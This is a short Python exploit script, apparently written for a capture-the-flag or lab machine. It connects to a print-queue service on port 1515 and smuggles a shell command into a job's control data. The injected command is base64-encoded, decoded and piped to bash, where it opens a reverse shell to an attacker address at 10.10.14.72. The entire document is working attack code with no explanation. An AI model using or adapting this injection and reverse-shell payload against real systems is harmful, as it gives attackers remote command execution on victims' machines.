import base64
import socket

target = "10.129.72.131"
port = 1515
queue = "archive_intake"

bash_shell = 'bash -i >& /dev/tcp/10.10.14.72/4321 0>&1' 
b64Enshell = base64.b64encode(bash_shell.encode()).decode()
cmd = f"J'; echo {b64Enshell} | base64 -d | bash #"

def b1t3(arg):
    return bytes([arg])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.sendall(b1t3(2) + queue.encode() + b'\n')
res = s.recv(4096)
print(res)


s.sendall(b1t3(2) + f"{len(cmd)} cfA00localhost".encode())
s.recv(1024)


s.sendall(cmd.encode())
s.close()
